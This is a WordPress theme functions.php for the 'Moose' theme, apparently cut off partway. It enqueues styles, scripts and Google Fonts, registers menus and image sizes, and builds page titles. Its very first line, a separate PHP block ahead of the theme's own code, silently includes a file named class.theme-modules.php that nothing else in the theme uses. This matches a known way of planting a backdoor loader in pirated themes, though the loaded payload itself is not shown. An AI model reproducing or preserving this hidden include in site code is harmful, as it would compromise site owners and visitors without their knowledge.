<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

require_once get_template_directory() . '/theme-includes.php';


if(!function_exists('moose_elated_load_theme_text_domain')) {
	/**
	 * Function that sets theme domain. Hooks to after_setup_theme action
	 *
	 * @see load_theme_textdomain()
	 */
	function moose_elated_load_theme_text_domain() {
		load_theme_textdomain( 'moose', get_template_directory().'/languages' );
	}

	add_action('after_setup_theme', 'moose_elated_load_theme_text_domain');
}


if (!function_exists('moose_elated_styles')) {
	/**
	 * Function that includes theme's core styles
	 */
	function moose_elated_styles() {
		$moose_elated_options = moose_elated_return_global_options();
        global $moose_elated_landing;
        global $moose_elated_toolbar;
		global $moose_elated_icon_collections;

		//init variables
		$responsiveness = 'yes';
		$vertical_area_hidden = '';

		wp_register_style("moose-elated-blog", MOOSE_ELATED_ROOT . "/css/blog.css");

		//include theme's core styles
		wp_enqueue_style("moose-elated-default-style", MOOSE_ELATED_ROOT . "/style.css");
		
		wp_enqueue_style('wp-mediaelement' );
		wp_enqueue_style("moose-elated-stylesheet", MOOSE_ELATED_ROOT . "/css/stylesheet.css");
		wp_enqueue_style("prettyPhoto", MOOSE_ELATED_ROOT . "/css/prettyPhoto.css");


		//Print-specific CSS
		wp_enqueue_style("moose-elated-print-stylesheet", MOOSE_ELATED_ROOT . "/css/print.css");


		if(moose_elated_load_blog_assets()) {
			wp_enqueue_style('moose-elated-blog');
		}

		//define files afer which style dynamic needs to be included. It should be included last so it can override other files
		$style_dynamic_deps_array = array();
		if(moose_elated_load_woo_assets()) {
			$style_dynamic_deps_array[] = 'moose-elated-woocommerce';
		}

		//include icon collections styles
		if(is_array($moose_elated_icon_collections->iconCollections) && count($moose_elated_icon_collections->iconCollections)) {
			foreach ($moose_elated_icon_collections->iconCollections as $collection_key => $collection_obj) {
				wp_enqueue_style('moose-elated-'.$collection_key, $collection_obj->styleUrl);
			}
		}

		//does responsive option exists?
		if (isset($moose_elated_options['responsiveness'])) {
			$responsiveness = $moose_elated_options['responsiveness'];
		}

		//is responsive option turned on?
		if ($responsiveness != "no") {
			//include proper styles
			wp_enqueue_style("moose-elated-responsive", MOOSE_ELATED_ROOT . "/css/responsive.min.css");
            if(moose_elated_load_woo_assets()) {
				$style_dynamic_deps_array[] = 'moose-elated-woocommerce-responsive';
			}

            if (file_exists(get_template_directory() ."/css/style_dynamic_responsive.css") && moose_elated_is_css_folder_writable() && !is_multisite()){
                wp_enqueue_style("moose-elated-style-dynamic-responsive", MOOSE_ELATED_ROOT . "/css/style_dynamic_responsive.css", array(), filemtime(get_template_directory() ."/css/style_dynamic_responsive.css"));
            } else if ( file_exists( MOOSE_ELATED_CSS_ROOT_DIR . '/style_dynamic_responsive_ms_id_' . moose_elated_get_multisite_blog_id() . '.css' ) && moose_elated_is_css_folder_writable() && is_multisite() ) {
	            wp_enqueue_style('moose-elated-style-dynamic-responsive', MOOSE_ELATED_CSS_ROOT . '/style_dynamic_responsive_ms_id_' . moose_elated_get_multisite_blog_id() . '.css', array(), filemtime( MOOSE_ELATED_CSS_ROOT_DIR . '/style_dynamic_responsive_ms_id_' . moose_elated_get_multisite_blog_id() . '.css' ) );
            }else {
                wp_enqueue_style("moose-elated-style-dynamic-responsive", MOOSE_ELATED_ROOT . "/css/style_dynamic_responsive_callback.php");
            }
		}

		//is hidden menu enabled?
		if (isset($moose_elated_options['vertical_area_type'])){
			$vertical_area_hidden = $moose_elated_options['vertical_area_type'];
		}

		//is left menu activated and is responsive turned on?
		if(moose_elated_is_side_header() && $responsiveness != "no" && $vertical_area_hidden!='hidden'){
			wp_enqueue_style("moose-elated-vertical-responsive", MOOSE_ELATED_ROOT . "/css/vertical_responsive.min.css");
		}
		
		$custom_css = $moose_elated_options['custom_css'];
		
		if ( ! empty( $custom_css ) ) {
			if ( $responsiveness != "no" ) {
				wp_add_inline_style( 'moose-elated-style-dynamic-responsive', $custom_css );
			} else {
				wp_add_inline_style( 'moose-elated-style-dynamic', $custom_css );
			}
		}
		
		$custom_svg_css = $moose_elated_options['custom_svg_css'];
		
		if ( ! empty( $custom_svg_css ) ) {
			if ( $responsiveness != "no" ) {
				wp_add_inline_style( 'moose-elated-style-dynamic-responsive', $custom_svg_css );
			} else {
				wp_add_inline_style( 'moose-elated-style-dynamic', $custom_svg_css );
			}
		}
		
        //is landing turned on?
        if (isset($moose_elated_landing)) {
            //include ladnding specific styles
            wp_enqueue_style("moose-elated-landing-fancybox", get_home_url() . "/demo-files/landing/css/jquery.fancybox.css");
            wp_enqueue_style("moose-elated-landing-tilt", get_home_url() . "/demo-files/landing/css/tiltslider.css");
			wp_enqueue_style("moose-elated-landing", get_home_url() . "/demo-files/landing/css/landing_stylesheet.css");
        }

        //is toolbar turned on?
        if (isset($moose_elated_toolbar)) {
            //include toolbar specific styles
            wp_enqueue_style("moose-elated-toolbar",  get_home_url() . "/demo-files/toolbar/css/toolbar.css");
        }

        if (file_exists(get_template_directory() ."/css/style_dynamic.css") && moose_elated_is_css_folder_writable() && !is_multisite()) {
            wp_enqueue_style("moose-elated-style-dynamic", MOOSE_ELATED_ROOT . "/css/style_dynamic.css", $style_dynamic_deps_array, filemtime(get_template_directory() ."/css/style_dynamic.css")); //it must be included after woocommerce styles so it can override it
        } else if ( file_exists( MOOSE_ELATED_CSS_ROOT_DIR . '/style_dynamic_ms_id_' . moose_elated_get_multisite_blog_id() . '.css' ) && moose_elated_is_css_folder_writable() && is_multisite() ) {
	        wp_enqueue_style('moose-elated-style-dynamic', MOOSE_ELATED_CSS_ROOT . '/style_dynamic_ms_id_' . moose_elated_get_multisite_blog_id() . '.css', array(), filemtime( MOOSE_ELATED_CSS_ROOT_DIR . '/style_dynamic_ms_id_' . moose_elated_get_multisite_blog_id() . '.css' ) );
        } else {
            wp_enqueue_style("moose-elated-style-dynamic", MOOSE_ELATED_ROOT . "/css/style_dynamic_callback.php", $style_dynamic_deps_array); //it must be included after woocommerce styles so it can override it
        }

        //include Visual Composer styles
		if (class_exists('WPBakeryVisualComposerAbstract')) {
			wp_enqueue_style( 'js_composer_front' );
		}
	}

	add_action('wp_enqueue_scripts', 'moose_elated_styles');
}


if(!function_exists('moose_elated_browser_specific_styles')) {
	/**
	 * Function that includes browser specific styles. Works for Chrome on Mac and for webkit browsers
	 */
	function moose_elated_browser_specific_styles() {
		global $is_chrome;
		global $is_safari;

		//check Chrome version
		preg_match( "#Chrome/(.+?)\.#", getenv('HTTP_USER_AGENT'), $match );
		if(!empty($match)) {
			$chrome_version = $match[1];
		} else{
			$chrome_version = 0;
		}

		//is Mac OS X?
		$mac_os = strpos(getenv('HTTP_USER_AGENT'), "Macintosh; Intel Mac OS X");

		//is Chrome on Mac with version greater than 21
		if($is_chrome && ($mac_os !== false) && ($chrome_version > 21)) {
			//include mac specific styles
			wp_enqueue_style("moose-elated-mac-stylesheet", MOOSE_ELATED_ROOT . "/css/mac_stylesheet.css");
		}

		//is Chrome or Safari?
		if($is_chrome || $is_safari) {
			//include style for webkit browsers only
			wp_enqueue_style("moose-elated-webkit", MOOSE_ELATED_ROOT . "/css/webkit_stylesheet.css");
		}
	}

	add_action('wp_enqueue_scripts', 'moose_elated_browser_specific_styles');
}

/* Page ID */

if(!function_exists('moose_elated_init_page_id')) {
	/**
	 * Function that initializes global variable that holds current page id
	 */
	function moose_elated_init_page_id() {
		global $wp_query;
		global $eltd_page_id;

		$eltd_page_id = $wp_query->get_queried_object_id();
	}

	add_action('get_header', 'moose_elated_init_page_id');
}


if(!function_exists('moose_elated_google_fonts_styles')) {
	/**
	 * Function that includes google fonts defined anywhere in the theme
	 */
	function moose_elated_google_fonts_styles() {
		$moose_elated_options = moose_elated_return_global_options();
		global $moose_elated_framework;

		$font_sipmle_field_array = array();
		if(is_array($moose_elated_framework->eltdOptions->getOptionsByType('fontsimple')) && count($moose_elated_framework->eltdOptions->getOptionsByType('fontsimple')) > 0){
			$font_sipmle_field_array = $moose_elated_framework->eltdOptions->getOptionsByType('fontsimple');
		}
		$font_field_array = array();
		if(is_array($moose_elated_framework->eltdOptions->getOptionsByType('font')) && count($moose_elated_framework->eltdOptions->getOptionsByType('font')) > 0){
			$font_field_array = $moose_elated_framework->eltdOptions->getOptionsByType('font');
		}
		$available_font_options = array_merge($font_sipmle_field_array, $font_field_array);
		$font_weight_str = '100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic';

		//define available font options array
		$fonts_array = array();
		foreach($available_font_options as $font_option) {
			//is font set and not set to default and not empty?
			if(isset($moose_elated_options[$font_option]) && $moose_elated_options[$font_option] !== '-1' && $moose_elated_options[$font_option] !== '' && !moose_elated_is_native_font($moose_elated_options[$font_option])) {
				$font_option_string = $moose_elated_options[$font_option].':'.$font_weight_str;
				if(!in_array($font_option_string, $fonts_array)) {
					$fonts_array[] = $font_option_string;
				}
			}
		}

		//add google fonts set in slider
		$args = array( 'post_type' => 'slides', 'posts_per_page' => -1);
		$loop = new WP_Query( $args );

		//for each slide defined
		while ( $loop->have_posts() ) : $loop->the_post();

			//is font family for title option chosen?
			if(get_post_meta(get_the_ID(), "eltd_slide-title-font-family", true) != "" && !moose_elated_is_native_font(get_post_meta(get_the_ID(), "eltd_slide-title-font-family", true))) {
				$slide_title_font_string = get_post_meta(get_the_ID(), "eltd_slide-title-font-family", true) . ":".$font_weight_str;
				if(!in_array($slide_title_font_string, $fonts_array)) {
					//include that font
					array_push($fonts_array, $slide_title_font_string);
				}
			}

			//is font family defined for slide's text?
			if(get_post_meta(get_the_ID(), "eltd_slide-text-font-family", true) != "" && !moose_elated_is_native_font(get_post_meta(get_the_ID(), "eltd_slide-text-font-family", true))) {
				$slide_text_font_string = get_post_meta(get_the_ID(), "eltd_slide-text-font-family", true) . ":".$font_weight_str;
				if(!in_array($slide_text_font_string, $fonts_array)) {
					//include that font
					array_push($fonts_array, $slide_text_font_string);
				}
			}

			//is font family defined for slide's subtitle?
			if(get_post_meta(get_the_ID(), "eltd_slide-subtitle-font-family", true) != "" && !moose_elated_is_native_font(get_post_meta(get_the_ID(), "eltd_slide-subtitle-font-family", true))) {
				$slide_subtitle_font_string = get_post_meta(get_the_ID(), "eltd_slide-subtitle-font-family", true) .":".$font_weight_str;
				if(!in_array($slide_subtitle_font_string, $fonts_array)) {
					//include that font
					array_push($fonts_array, $slide_subtitle_font_string);
				}
			}
		endwhile;

		wp_reset_postdata();


		$fonts_array = array_diff($fonts_array, array("-1:".$font_weight_str));
		$google_fonts_string = implode( '|', $fonts_array);

        //default fonts should be separated with |
		$default_font_string = 'Raleway:'.$font_weight_str.'|Marck Script:'.$font_weight_str.'|Montserrat:'.$font_weight_str;

		//is google font option checked anywhere in theme?
        if (count($fonts_array) > 0) {
            //include all checked fonts
			$fonts_full_list = $default_font_string . '|' . str_replace('+', ' ', $google_fonts_string);
			$fonts_full_list_args = array(
				'family' => urlencode($fonts_full_list),
				'subset' => urlencode('latin,latin-ext'),
			);

			$eltd_fonts = add_query_arg( $fonts_full_list_args, 'https://fonts.googleapis.com/css' );
			wp_enqueue_style( 'moose_elated_google_fonts', esc_url_raw($eltd_fonts), array(), '1.0.0' );
        } else {
            //include default google font that theme is using
			$default_fonts_args = array(
				'family' => urlencode($default_font_string),
				'subset' => urlencode('latin,latin-ext'),
			);
			$eltd_fonts = add_query_arg( $default_fonts_args, 'https://fonts.googleapis.com/css' );
			wp_enqueue_style( 'moose-elated-google-fonts', esc_url_raw($eltd_fonts), array(), '1.0.0' );
        }

    }

	add_action('wp_enqueue_scripts', 'moose_elated_google_fonts_styles');
}


if (!function_exists('moose_elated_scripts')) {
	/**
	 * Function that includes all necessary scripts
	 */
	function moose_elated_scripts() {
		$moose_elated_options = moose_elated_return_global_options();
        global $moose_elated_landing;
        global $moose_elated_toolbar;
		global $wp_scripts;

		//init variables
		$smooth_scroll 	= true;
		$has_ajax 		= false;
		$eltd_animation = "";

		//is smooth scroll option turned on?
		if(isset($moose_elated_options['smooth_scroll']) && $moose_elated_options['smooth_scroll'] == "no"){
			$smooth_scroll = false;
		}
		
		wp_enqueue_script( 'jquery-ui-core' );
		wp_enqueue_script( 'jquery-ui-widget' );
		wp_enqueue_script( 'jquery-ui-mouse' );
		wp_enqueue_script( 'jquery-ui-draggable' );
		wp_enqueue_script( 'jquery-ui-droppable' );
		wp_enqueue_script( 'jquery-ui-resizable' );
		wp_enqueue_script( 'jquery-ui-selectable' );
		wp_enqueue_script( 'jquery-ui-sortable' );
		wp_enqueue_script( 'jquery-ui-accordion' );
		wp_enqueue_script( 'jquery-ui-autocomplete' );
		wp_enqueue_script( 'jquery-ui-button' );
		wp_enqueue_script( 'jquery-ui-datepicker' );
		wp_enqueue_script( 'jquery-ui-dialog' );
		wp_enqueue_script( 'jquery-effects-core' );
		wp_enqueue_script( 'jquery-effects-blind' );
		wp_enqueue_script( 'jquery-effects-bounce' );
		wp_enqueue_script( 'jquery-effects-clip' );
		wp_enqueue_script( 'jquery-effects-drop' );
		wp_enqueue_script( 'jquery-effects-explode' );
		wp_enqueue_script( 'jquery-effects-fade' );
		wp_enqueue_script( 'jquery-effects-fold' );
		wp_enqueue_script( 'jquery-effects-highlight' );
		wp_enqueue_script( 'jquery-effects-pulsate' );
		wp_enqueue_script( 'jquery-effects-scale' );
		wp_enqueue_script( 'jquery-effects-shake' );
		wp_enqueue_script( 'jquery-effects-slide' );
		wp_enqueue_script( 'jquery-effects-transfer' );
		wp_enqueue_script( 'jquery-ui-menu' );
		wp_enqueue_script( 'jquery-ui-position' );
		wp_enqueue_script( 'jquery-ui-progressbar' );
		wp_enqueue_script( 'jquery-ui-slider' );
		wp_enqueue_script( 'jquery-ui-spinner' );
		wp_enqueue_script( 'jquery-ui-tabs' );
		wp_enqueue_script( 'jquery-ui-tooltip' );
		wp_enqueue_script( 'jquery-form' );
		wp_enqueue_script( 'wp-mediaelement' );
		
		wp_enqueue_script( 'doubletaptogo', MOOSE_ELATED_JS_ROOT . '/plugins/doubletaptogo.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'modernizr', MOOSE_ELATED_JS_ROOT . '/plugins/modernizr.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'appear', MOOSE_ELATED_JS_ROOT . '/plugins/jquery.appear.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'hoverIntent' );
		wp_enqueue_script( 'absoluteCounter', MOOSE_ELATED_JS_ROOT . '/plugins/absoluteCounter.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'easypiechart', MOOSE_ELATED_JS_ROOT . '/plugins/easypiechart.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'mixitup', MOOSE_ELATED_JS_ROOT . '/plugins/jquery.mixitup.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'nicescroll', MOOSE_ELATED_JS_ROOT . '/plugins/jquery.nicescroll.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'prettyPhoto', MOOSE_ELATED_JS_ROOT . '/plugins/jquery.prettyPhoto.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'fitvids', MOOSE_ELATED_JS_ROOT . '/plugins/jquery.fitvids.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'flexslider', MOOSE_ELATED_JS_ROOT . '/plugins/jquery.flexslider-min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'infiniteScroll', MOOSE_ELATED_JS_ROOT . '/plugins/infiniteScroll.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'waitforimages', MOOSE_ELATED_JS_ROOT . '/plugins/jquery.waitforimages.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'waypoints-jquery', MOOSE_ELATED_JS_ROOT . '/plugins/waypoints.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'jplayer', MOOSE_ELATED_JS_ROOT . '/plugins/jplayer.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'bootstrap-carousel', MOOSE_ELATED_JS_ROOT . '/plugins/bootstrap.carousel.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'skrollr', MOOSE_ELATED_JS_ROOT . '/plugins/skrollr.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'Chart', MOOSE_ELATED_JS_ROOT . '/plugins/Chart.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'jquery-easing-1.3', MOOSE_ELATED_JS_ROOT . '/plugins/jquery.easing.1.3.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'countdown', MOOSE_ELATED_JS_ROOT . '/plugins/countdown.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'multiscroll', MOOSE_ELATED_JS_ROOT . '/plugins/jquery.multiscroll.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script("carouFredSel", MOOSE_ELATED_JS_ROOT."/plugins/jquery.carouFredSel-6.2.1.js",array("jquery"),false,true);
		wp_enqueue_script("fullPage", MOOSE_ELATED_JS_ROOT."/plugins/jquery.fullPage.min.js",array("jquery"),false,true);
		wp_enqueue_script("lemmonSlider", MOOSE_ELATED_JS_ROOT."/plugins/lemmon-slider.js",array("jquery"),false,true);
		wp_enqueue_script("mousewheel", MOOSE_ELATED_JS_ROOT."/plugins/jquery.mousewheel.min.js",array("jquery"),false,true);
		wp_enqueue_script("touchSwipe", MOOSE_ELATED_JS_ROOT."/plugins/jquery.touchSwipe.min.js",array("jquery"),false,true);
		wp_enqueue_script("isotope", MOOSE_ELATED_JS_ROOT."/plugins/jquery.isotope.min.js",array("jquery"),false,true);
		wp_enqueue_script("typed", MOOSE_ELATED_JS_ROOT."/plugins/typed.js",array("jquery"),false,true);

	   //include google map api script
        if (isset($moose_elated_options['google_maps_api_key']) && ($moose_elated_options['google_maps_api_key'] != "")) {
            $google_maps_api_key = $moose_elated_options['google_maps_api_key'];
            wp_enqueue_script("google-map-api", "https://maps.googleapis.com/maps/api/js?key=" . $google_maps_api_key,array(),false,true);
        }

        if (file_exists(get_template_directory() ."/js/default_dynamic.js") && moose_elated_is_js_folder_writable() && !is_multisite()) {
            wp_enqueue_script("moose-elated-default-dynamic", MOOSE_ELATED_JS_ROOT."/default_dynamic.js",array("jquery"), filemtime(get_template_directory() ."/js/default_dynamic.js"),true);
        } else if ( file_exists( MOOSE_ELATED_JS_ROOT_DIR . '/default_dynamic_ms_id_' . moose_elated_get_multisite_blog_id() . '.js' ) && moose_elated_is_js_folder_writable() && is_multisite() ) {
	        wp_enqueue_script( 'moose-elated-default-dynamic', MOOSE_ELATED_JS_ROOT . '/default_dynamic_ms_id_' . moose_elated_get_multisite_blog_id() . '.js', array('jquery'), filemtime( MOOSE_ELATED_JS_ROOT_DIR . '/default_dynamic_ms_id_' . moose_elated_get_multisite_blog_id() . '.js' ), true );
        } else {
            wp_enqueue_script("moose-elated-default-dynamic", MOOSE_ELATED_JS_ROOT."/default_dynamic_callback.php", array("jquery"), false, true);
        }

        wp_enqueue_script("moose-elated-default", MOOSE_ELATED_JS_ROOT."/default.min.js", array("jquery"), false, true);
		
		$custom_js = $moose_elated_options['custom_js'];
		if ( ! empty( $custom_js ) ) {
			wp_add_inline_script( 'moose-elated-default', $custom_js );
		}
  
		if(moose_elated_load_blog_assets()) {
			wp_enqueue_script('moose-elated-blog', MOOSE_ELATED_JS_ROOT."/blog.min.js", array("jquery"), false, true);
		}
       

        //is smooth scroll enabled enabled and not Mac device?
        $mac_os = strpos(getenv('HTTP_USER_AGENT'), "Macintosh; Intel Mac OS X");
        if($smooth_scroll && $mac_os == false){
            wp_enqueue_script("TweenLite", MOOSE_ELATED_JS_ROOT."/plugins/TweenLite.min.js",array("jquery"),false,true);
            wp_enqueue_script("ScrollToPlugin", MOOSE_ELATED_JS_ROOT."/plugins/ScrollToPlugin.min.js",array("jquery"),false,true);
            wp_enqueue_script("smoothPageScroll", MOOSE_ELATED_JS_ROOT."/plugins/smoothPageScroll.js",array("jquery"),false,true);
        }

		//include comment reply script
		$wp_scripts->add_data('comment-reply', 'group', 1 );
		if (is_singular()) {
			wp_enqueue_script( "comment-reply");
		}

		if (($moose_elated_options['page_transitions'] != "0") && (empty($eltd_animation) || ($eltd_animation != "no"))) {
			$has_ajax = true;
		} elseif (!empty($eltd_animation) && ($eltd_animation != "no"))
			$has_ajax = true;

		if ($has_ajax) {
			//wp_enqueue_script("moose-elated-ajax", MOOSE_ELATED_ROOT."/js/ajax.min.js",array("jquery"),false,true);
		}

		//include Visual Composer script
		if (class_exists('WPBakeryVisualComposerAbstract')) {
			wp_enqueue_script( 'wpb_composer_front_js' );
		}

        //is landing enabled?
        if(isset($moose_elated_landing)) {
            wp_enqueue_script("moose-elated-landing-fancybox", get_home_url() . "/demo-files/landing/js/jquery.fancybox.js",array("jquery"),false,true);
            wp_enqueue_script("moose-elated-landing-classie", get_home_url() . "/demo-files/landing/js/classie.js",array("jquery"),false,true);
            wp_enqueue_script("moose-elated-landing-tilt", get_home_url() . "/demo-files/landing/js/tiltslider.js",array("jquery"),false,true);
            wp_enqueue_script("moose-elated-landing", get_home_url() . "/demo-files/landing/js/landing_default.js",array("jquery"),false,true);
        }

        //is toolbar enabled?
        if(isset($moose_elated_toolbar)) {
            //include toolbar specific script
            wp_enqueue_script("moose-elated-toolbar", get_home_url() . "/demo-files/toolbar/js/toolbar.js",array("jquery"),false,true);
            wp_enqueue_script("moose-elated-landing", get_home_url() . "/demo-files/landing/js/landing_default.js",array("jquery"),false,true);
        }

    }

	add_action('wp_enqueue_scripts', 'moose_elated_scripts');
}

if ( ! function_exists( 'moose_elated_set_global_variables' ) ) {
	function moose_elated_set_global_variables() {
		$sticky_scroll_amount = get_post_meta( moose_elated_get_page_id(), "eltd_page_scroll_amount_for_sticky", true );
		
		if ( $sticky_scroll_amount !== '' ) {
			wp_localize_script( 'moose-elated-default', 'page_scroll_amount_for_sticky', $sticky_scroll_amount );
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'moose_elated_set_global_variables' );
}

if(!function_exists('moose_elated_browser_specific_scripts')) {
	/**
	 * Function that loads browser specific scripts
	 */
	function moose_elated_browser_specific_scripts() {
		global $is_IE;

		//is ie?
		if ($is_IE) {
			wp_enqueue_script("html5", MOOSE_ELATED_JS_ROOT."/plugins/html5.js",array("jquery"),false,false);
		}
	}

	add_action('wp_enqueue_scripts', 'moose_elated_browser_specific_scripts');
}

if(!function_exists('moose_elated_woocommerce_assets')) {
	/**
	 * Function that includes all necessary scripts for WooCommerce if installed
	 */
	function moose_elated_woocommerce_assets() {
		$moose_elated_options = moose_elated_return_global_options();

		//is woocommerce installed?
		if(moose_elated_is_woocommerce_installed()) {
			if(moose_elated_load_woo_assets()) {
				//get woocommerce specific scripts
				wp_enqueue_script("moose-elated-woocommerce-script", MOOSE_ELATED_JS_ROOT . "/woocommerce.js", array("jquery"), false, true);
				wp_enqueue_script("select2", MOOSE_ELATED_JS_ROOT . "/plugins/select2.min.js", array("jquery"), false, true);

				//include theme's woocommerce styles
				wp_enqueue_style("moose-elated-woocommerce", MOOSE_ELATED_ROOT . "/css/woocommerce.css");

				//is responsive option turned on?
				if ($moose_elated_options['responsiveness'] == 'yes') {
					//include theme's woocommerce responsive styles
					wp_enqueue_style("moose-elated-woocommerce-responsive", MOOSE_ELATED_ROOT . "/css/woocommerce_responsive.min.css");
				}
			}
		}
	}

	add_action('wp_enqueue_scripts', 'moose_elated_woocommerce_assets');
}

if (!function_exists('moose_elated_register_menus')) {
	/**
	 * Function that registers menu locations
	 */
	function moose_elated_register_menus() {
		$moose_elated_options = moose_elated_return_global_options();

        if((isset($moose_elated_options['header_bottom_appearance']) && $moose_elated_options['header_bottom_appearance'] != "stick_with_left_right_menu") || (moose_elated_is_side_header())){
            //header and left menu location
            register_nav_menus(
                array('top-navigation' => esc_html__( 'Top Navigation', 'moose')
                )
            );
        }

		//popup menu location
		register_nav_menus(
			array('popup-navigation' => esc_html__( 'Fullscreen Navigation', 'moose')
			)
		);

        if((isset($moose_elated_options['header_bottom_appearance']) && $moose_elated_options['header_bottom_appearance'] == "stick_with_left_right_menu") && (!moose_elated_is_side_header())){
            //header left menu location
            register_nav_menus(
                array('left-top-navigation' => esc_html__( 'Left Top Navigation', 'moose')
                )
            );

            //header right menu location
            register_nav_menus(
                array('right-top-navigation' => esc_html__( 'Right Top Navigation', 'moose')
                )
            );
        }
	}

	add_action( 'after_setup_theme', 'moose_elated_register_menus' );
}

if(!function_exists('moose_elated_add_theme_support')) {
	/**
	 * Function that adds various features to theme. Also defines image sizes that are used in a theme
	 */
	function moose_elated_add_theme_support() {
		//add support for feed links
		add_theme_support( 'automatic-feed-links' );

		//add support for post formats
		add_theme_support('post-formats', array('gallery', 'link', 'quote', 'video', 'audio'));

		//add theme support for post thumbnails
		add_theme_support( 'post-thumbnails' );

        //add theme support for title tag
		add_theme_support( 'title-tag' );

		//defined content width variable
		$GLOBALS['content_width'] = 1060;

		//define thumbnail sizes
		add_image_size( 'eltd-moose-portfolio-square', 550, 550, true );
		add_image_size( 'eltd-moose-portfolio-landscape', 800, 600, true );
		add_image_size( 'eltd-moose-portfolio-portrait', 600, 800, true );
		add_image_size( 'eltd-moose-portfolio-masonry-wide', 1000, 500, true );
		add_image_size( 'eltd-moose-portfolio-masonry-tall', 500, 1000, true );
		add_image_size( 'eltd-moose-portfolio-masonry-large', 1000, 1000, true );
		add_image_size( 'eltd-moose-portfolio-masonry-with-space', 700);
		add_image_size( 'eltd-moose-blog-image-format-link-quote', 1100, 500, true);
		add_image_size( "grid-thumbnail", 550, 550, array("center", "top"));

	}

	add_action('after_setup_theme', 'moose_elated_add_theme_support');
}


if(!function_exists('moose_elated_rgba_color')) {
    /**
     * Function that generates rgba part of css color property
     * @param $color string hex color
     * @param $transparency float transparency value between 0 and 1
     * @return string generated rgba string
     */
    function moose_elated_rgba_color($color, $transparency) {
        if($color !== '' && $transparency !== '') {
            $rgba_color = '';

            $rgb_color_array = moose_elated_hex2rgb($color);
            $rgba_color .= 'rgba('.implode(', ', $rgb_color_array).', '.$transparency.')';

            return $rgba_color;
        }
    }
}


if(!function_exists('moose_elated_wp_title_text')) {
	/**
	 * Function that sets page's title. Hooks to wp_title filter
	 * @param $title string current page title
	 * @param $sep string title separator
	 * @return string changed title text if SEO plugins aren't installed
	 */
	function moose_elated_wp_title_text() {
		$moose_elated_options = moose_elated_return_global_options();


		//is SEO plugin installed?
		if(moose_elated_seo_plugin_installed()) {
			//don't do anything, seo plugin will take care of it
		} else {
			//get current post id
            $id = moose_elated_get_page_id();
			$sep = ' | ';
			$title_prefix = get_bloginfo('name');
			$title_suffix = '';
			$title = get_the_title($id);
			//is WooCommerce installed and is current page shop page?
			if(moose_elated_is_woocommerce_installed() && moose_elated_is_woocommerce_shop()) {
				//get shop page id
				$id = moose_elated_get_woo_shop_page_id();
			}

            //is WP 4.1 at least?
            if(function_exists('_wp_render_title_tag')) {
                //set unchanged title variable so we can use it later
                $title_array = explode($sep, $title);
                $unchanged_title = array_shift($title_array);
            }

            //pre 4.1 version of WP
            else {
                //set unchanged title variable so we can use it later
                $unchanged_title = $title;
            }

			//is eltd seo enabled?
			if(isset($moose_elated_options['disable_eltd_seo']) && $moose_elated_options['disable_eltd_seo'] !== 'yes') {
				//get current post seo title
				$seo_title = esc_attr(get_post_meta($id, "eltd_seo_title", true));

				//is current post seo title set?
				if($seo_title !== '') {
					$title_suffix = $seo_title;
				}
			}

			//title suffix is empty, which means that it wasn't set by eltd seo
			if(empty($title_suffix)) {
				//if current page is front page append site description, else take original title string
				$title_suffix = is_front_page() ? get_bloginfo('description') : $unchanged_title;
			}

			//concatenate title string
			$title  = $title_prefix.$sep.$title_suffix;

			//return generated title string
			return $title;
		}
	}

	add_filter('pre_get_document_title', 'moose_elated_wp_title_text');
}

if(!function_exists('moose_elated_header_meta')) {
	/**
	 * Function that echoes meta data if our seo is enabled
	 */
	function moose_elated_header_meta() { ?>
		
		<meta charset="<?php bloginfo( 'charset' ); ?>" />
        <link rel="profile" href="http://gmpg.org/xfn/11" />
        <link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />

	<?php }

	add_action('moose_elated_header_meta', 'moose_elated_header_meta');
}

if(!function_exists('moose_elated_user_scalable_meta')) {
    /**
     * Function that outputs user scalable meta if responsiveness is turned on
     * Hooked to moose_elated_header_meta action
     */
    function moose_elated_user_scalable_meta() {
        //is responsiveness option is chosen?
        if (moose_elated_is_responsive_on()) { ?>
            <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
        <?php }	else { ?>
            <meta name="viewport" content="width=1200,user-scalable=no">
        <?php }
    }

    add_action('moose_elated_header_meta', 'moose_elated_user_scalable_meta');
}

if(!function_exists('moose_elated_get_page_id')) {
	/**
	 * Function that returns current page / post id.
	 * Checks if current page is woocommerce page and returns that id if it is.
	 * Checks if current page is any archive page (category, tag, date, author etc.) and returns -1 because that isn't
	 * page that is created in WP admin.
	 *
	 * @return int
	 *
	 * @version 0.1
	 *
	 * @see moose_elated_is_woocommerce_installed()
	 * @see moose_elated_is_woocommerce_shop()
	 */
	function moose_elated_get_page_id() {
		if(moose_elated_is_woocommerce_installed() && (moose_elated_is_woocommerce_shop() || is_singular('product'))) {
			return moose_elated_get_woo_shop_page_id();
		}

		if(is_archive() || is_search() || is_404()) {
			return -1;
		}

		return get_queried_object_id();
	}
}

if(!function_exists('moose_elated_set_logo_sizes')) {
	/**
	 * Function that sets logo image dimensions to global eltd options array so it can be used in the theme
	 */
	function moose_elated_set_logo_sizes() {
		global $moose_elated_options;

		if (isset($moose_elated_options['logo_image'])){
			//get logo image size
			$logo_image_sizes = moose_elated_get_image_dimensions($moose_elated_options['logo_image']);
